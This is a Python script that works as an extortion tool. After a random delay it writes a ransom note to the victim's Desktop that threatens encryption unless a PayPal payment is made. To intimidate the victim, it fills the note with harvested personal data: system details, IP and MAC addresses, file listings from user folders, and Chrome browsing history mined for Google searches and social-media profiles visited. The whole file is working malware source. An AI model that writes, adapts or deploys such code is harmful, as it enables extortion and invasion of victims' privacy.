import glob
import os
from pathlib import Path
from shutil import copyfile
from time import sleep
from random import randrange
import sqlite3
import re
import socket
from getmac import get_mac_address as gma
import platform
import psutil as psutil


HACKER_FILE_NAME = "README.txt"


def get_user_path():
    return "{}\\".format(Path.home())


def delay_action():
    n_hours = randrange(1, 4)
    print("Sleeping {} hours.".format(n_hours))
    sleep(n_hours)


def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
    hacker_file.write("Your entire computer has been hacked!.\nDon't try to delete this file cause it's going to be "
                      "worst.\nI've been watching all of your behavior in the past few days, and I'm ready to make "
                      "a deal...\nYou'll make a transaction to the following paypal direction "
                      "(ransomware_CRLF@ru.vk.com) if you don't want your files to be heavily encrypted.\n"
                      "You don't trust me yet? Well, here some proofs:\n")
    return hacker_file


def get_user_data(hacker_file):
    # Local username
    hacker_file.write("\nLocal username: {}".format(os.getlogin()))
    # Local machine name
    hostname = socket.gethostname()
    hacker_file.write("\nYour local machine name: {}".format(hostname))
    # Processor
    processor = (platform.processor())
    frequency = str(psutil.cpu_freq().max)
    cores = str(psutil.cpu_count())
    hacker_file.write("\nProcessor: {}, {} MHz, {} cores".format(processor, frequency, cores))
    # Ram
    ram = str(round(psutil.virtual_memory().total / (1024.0 ** 3), 1))
    hacker_file.write("\nRAM: {} GB".format(ram))
    # OS
    hacker_file.write("\nOperating system: {} {} {}".format(platform.system(), platform.release(), platform.version()))
    # IP address
    local_ip = socket.gethostbyname(hostname)
    hacker_file.write("\nYour IPv4 address: {}".format(local_ip))
    # Mac address
    hacker_file.write("\nYour Wi-Fi adapter MAC address: {}".format(gma()))


def get_path(user_path, hacker_file, exceptions, string, message):
    archives = []
    file_path = user_path + "{}/*".format(string)
    path = glob.glob(file_path)
    path.sort(key=os.path.getmtime, reverse=True)
    for file in path:
        file_found = file.split("\\")[-1]
        if file_found not in exceptions:
            archives.append(file_found)
    if len(archives) >= 1:
        hacker_file.write("\n\n{}\n\n-{}\n-...\n".format(message, "\n-".join(archives)))


def get_downloads(user_path, hacker_file):
    exceptions = ["desktop.ini"]
    string = "Downloads"
    message = "Some of your downloads:"
    get_path(user_path, hacker_file, exceptions, string, message)


def get_desktop(user_path, hacker_file):
    exceptions = ["desktop.ini"]
    string = "Desktop"
    message = "Desktop files:"
    get_path(user_path, hacker_file, exceptions, string, message)


def get_documents(user_path, hacker_file):
    exceptions = ["desktop.ini", "Mis imágenes", "Mi música", "Mis Vídeos"]
    string = "Documents"
    message = "Documents:"
    get_path(user_path, hacker_file, exceptions, string, message)


def get_pictures(user_path, hacker_file):
    exceptions = ["desktop.ini", "Saved Pictures", "Camera Roll"]
    string = "Pictures"
    message = "Pictures:"
    get_path(user_path, hacker_file, exceptions, string, message)


def get_files(user_path, hacker_file):
    get_downloads(user_path, hacker_file)
    get_desktop(user_path, hacker_file)
    get_documents(user_path, hacker_file)
    get_pictures(user_path, hacker_file)


def get_chrome_history(user_path):
    urls_chrome = None
    while not urls_chrome:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            temp_history_path = history_path + "temp"
            copyfile(history_path, temp_history_path)
            connection = sqlite3.connect(temp_history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, url FROM urls ORDER BY last_visit_time DESC")
            urls_chrome = cursor.fetchall()
            connection.close()
            print("Connected to Chrome history file.")
            return urls_chrome
        except sqlite3.OperationalError:
            print("History file not reachable, retrying in 5 seconds...\n")
            sleep(5)


def get_firefox_history(user_path):
    urls_firefox = None
    while not urls_firefox:
        try:
            history_path = user_path + "AppData/Roaming/Mozilla/Firefox/Profiles/l60p8m2u.default-release/places.sqlite"
            temp_history_path = history_path + "temp"
            copyfile(history_path, temp_history_path)
            connection = sqlite3.connect(temp_history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT moz_places.title, moz.places.url FROM moz_places")
            urls_firefox = cursor.fetchall()
            connection.close()
            print("Connected to Firefox history file.")
            return urls_firefox
        except sqlite3.OperationalError:
            print("History file not reachable, retrying in 5 seconds...\n")
            sleep(5)


def check_google_searches(hacker_file, chrome_history):
    google_searches = []
    print_message = False
    for item in chrome_history:
        results_link = re.findall("(https://www.google.com/search)", item[1])
        if results_link:
            print_message = True
            results = re.findall("([A-Za-zÀ-ÿ0-9_.&%$# ]+) - Buscar con Google", item[0])
            if results:
                if results[0] not in google_searches:
                    google_searches.append(results[0])
    if print_message:
        hacker_file.write("\n\nThis is what you were searching in Google:\n\n-{}\n-...\n"
                          .format("\n-".join(google_searches)))


def check_facebook_profiles(hacker_file, chrome_history):
    facebook_profiles_visited = []
    exceptions = ["", "Iniciar sesión en", "Watch", "Friends", "Facebook Marketplace", "Saved", "Groups"]
    print_message = False
    for item in chrome_history:
        results_link = re.findall("(https://www.facebook.com/)", item[1])
        if results_link:
            print_message = True
            notifications = re.findall("([(+0-9)]+)", item[0])
            if notifications:
                results = re.findall(" ([A-Za-zÀ-ÿ0-9_. ]+) | Facebook", item[0])
            else:
                results = re.findall("([A-Za-zÀ-ÿ0-9_. ]+) | Facebook", item[0])
            if results and results[0] not in exceptions:
                if results[0] not in [facebook_profiles_visited]:
                    facebook_profiles_visited.append(results[0])
    if print_message:
        hacker_file.write("\n\nYou were stalking some people on Facebook:\n\n-{}\n-...\n"
                          .format("\n-".join(facebook_profiles_visited)))


def check_youtube_channels(hacker_file, chrome_history):
    youtube_channels_visited = []
    print_message = False
    for item in chrome_history:
        results_link = re.findall("(https://www.youtube.com/c/)", item[1])
        if results_link:
            print_message = True
            results = re.findall("([A-Za-zÀ-ÿ0-9_.& -]+) - YouTube", item[0])
            if results:
                if results[0] not in youtube_channels_visited:
                    youtube_channels_visited.append(results[0])
    if print_message:
        hacker_file.write("\n\nYoutube channels you've visited:\n\n-{}\n-...\n"
                          .format("\n-".join(youtube_channels_visited)))


def check_twitter_profiles(hacker_file, chrome_history):
    twitter_profiles_visited = []
    exceptions = ["Notificaciones", "Mensajes", "Guardados", "Explore", "Inicio", "Twitter. Es lo que está pasando."]
    print_message = False
    for item in chrome_history:
        results_link = re.findall("(https://twitter.com/)", item[1])
        if results_link:
            print_message = True
            notifications = re.findall("([(+0-9)]+) (@)", item[0])
            if notifications:
                results = re.findall(" ([0-9a-zA-ZÀ-ÿ_.()@ ]+) / Twitter", item[0])
            else:
                results = re.findall("([0-9a-zA-ZÀ-ÿ_.()@ ]+) / Twitter", item[0])
            if results and results[0] not in exceptions:
                if results[0] not in twitter_profiles_visited:
                    twitter_profiles_visited.append(results[0])
    if print_message:
        hacker_file.write("\n\nLast Twitter profiles visited:\n\n-{}\n-...\n"
                          .format("\n-".join(twitter_profiles_visited)))


def write_history(hacker_file, chrome_history):
    write_history_into_file = []
    for item in chrome_history:
        results = re.findall("([A-Za-zÀ-ÿ0-9_.|@/:?&=% -]+)", item[1])
        if results:
            write_history_into_file.append(results[0])
    hacker_file.write("\n\nYour complete web browser history:\n\n{}".format("\n".join(write_history_into_file)))


def main():
    delay_action()
    user_path = get_user_path()
    hacker_file = create_hacker_file(user_path)
    get_user_data(hacker_file)
    get_files(user_path, hacker_file)
    chrome_history = get_chrome_history(user_path)
    check_google_searches(hacker_file, chrome_history)
    check_facebook_profiles(hacker_file, chrome_history)
    check_youtube_channels(hacker_file, chrome_history)
    check_twitter_profiles(hacker_file, chrome_history)
    print(chrome_history)


if __name__ == "__main__":
    main()
